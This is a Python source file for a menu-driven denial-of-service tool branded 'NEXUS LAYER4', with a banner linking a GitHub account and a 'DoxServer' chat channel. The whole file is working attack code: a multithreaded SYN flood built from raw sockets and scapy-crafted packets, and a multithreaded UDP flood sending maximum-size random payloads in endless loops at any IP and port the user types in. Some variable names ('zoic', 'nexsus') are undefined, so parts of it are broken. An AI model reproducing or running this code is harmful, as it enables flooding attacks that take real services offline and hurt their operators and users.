import os
import sys
import socket
import random
import threading
import time
from scapy.all import IP, TCP

nexus = "\033[38;5;118m"
white = "\033[97m"
red = "\033[38;5;196m"
green = "\033[38;5;34m"
clear = "\033[0m"

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{nexus}
██╗      █████╗ ██╗   ██╗███████╗██████╗     ██╗  ██╗
██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ██║  ██║
██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ███████║
██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗    ╚════██║
███████╗██║  ██║   ██║   ███████╗██║  ██║         ██║
╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝         ╚═╝{clear}
               
╔═════════════════════════════════════════════════════╗
║ {nexus}*{clear} Github    {nexus}:{clear}   https://github.com/Exileominous     ║
║ {nexus}*{clear} DoxServer {nexus}:{clear}   https://app.revolt.chat/channe/NEXUS║
║ {nexus}*{clear} version   {nexus}:{clear}   1.0                                 ║
║ {nexus}*{clear} NEXUS     {nexus}:{clear}   {nexus}[{clear}{white}LAYER4{clear}{nexus}]{clear}                            ║  
╚═════════════════════════════════════════════════════╝
          
╔═════════════════════════════════════════════════════╗
║ {nexus}[{clear}1{nexus}]{clear} SYN Flood Attack                                ║
║ {nexus}[{clear}2{nexus}]{clear} UDP Flood Attack                                ║                       
║ {nexus}[{clear}3{nexus}]{clear} Exit NEXUS                                      ║                                 
╚═════════════════════════════════════════════════════╝  
""")
    
def layer4():
    while True:
        logo()
        select = input(f"""
╔═══[{nexus}root{clear}@{nexus}NEXUS{clear}]
╚══{nexus}>{clear} """)
                                        
        if select == "1" or select.lower() == "s":
            def send_packet(target, port):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

                    while True:
                        sport = random.randint(1024, 65535)
                        seq = random.randint(0, 4294967295)

                        ip_header = IP(dst=target)
                        tcp_header = TCP(sport=sport, dport=port, flags='S', seq=seq)

                        packet = bytes(ip_header / tcp_header)
                        print(f"[{zoic}ZOIC{clear}] IP Address {zoic}:{clear} {target} {zoic}|{clear} SYN Packet {white}:{clear} {zoic}{ip_header / tcp_header}{clear}")
                        s.sendto(packet, (target, port)) 

                except Exception as e:
                    print(f"[{red}WARNING{clear}] Download {zoic}>{clear} https://npcap.com/#download")
                    time.sleep(3)
                    print(f"{red}......................ERROR......................{clear}")
                    time.sleep(2)
                    
                finally:
                    s.close()

            def start_threads(target, port, threads):
                thread_list = []

                for i in range(threads):
                    t = threading.Thread(target=send_packet, args=(target, port))
                    thread_list.append(t)
                    t.start()

                for t in thread_list:
                    t.join()

            target = input(f"[{nexsus}NEXUS{clear}] IP       {nexus}>{clear} ")
            port = int(input(f"[{nexus}NEXUS{clear}] PORT       {nexus}>{clear} "))
            threads = int(input(f"[{nexus}NEXUS{clear}] THREAD       {nexus}>{clear} "))
            start_threads(target, port, threads)


        elif select == "2" or select.lower() == "u":
            def send_packet(target, port):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                    while True:
                        sport = random.randint(1024, 65535)  
                        data = random.randbytes(65507)  

                        s.sendto(data, (target, port))

                        print(f"[{nexus}NEXUS{clear}] IP Address {nexus}:{clear} {target} {nexus}|{clear} UDP Packet {nexus}:{clear} {white}65507{clear}")

                except Exception as e:
                    print(f"{red}......................ERROR......................{clear}")
                    time.sleep(3)
                finally:
                    s.close()

            def start_threads(target, port, threads):
                thread_list = []

                for i in range(threads):
                    t = threading.Thread(target=send_packet, args=(target, port))
                    thread_list.append(t)
                    t.start()

                for t in thread_list:
                    t.join()

            target = input(f"[{nexus}NEXUS{clear}] IP       {nexus}>{clear} ")
            port = int(input(f"[{nexus}NEXUS{clear}] PORT       {nexus}>{clear} "))
            threads = int(input(f"[{nexus}NEXUS{clear}] THREAD       {nexus}>{clear} "))
            start_threads(target, port, threads)

        elif select == "3" or select.lower() == "e":
            sys.exit()


if __name__ == "__main__":
    layer4()

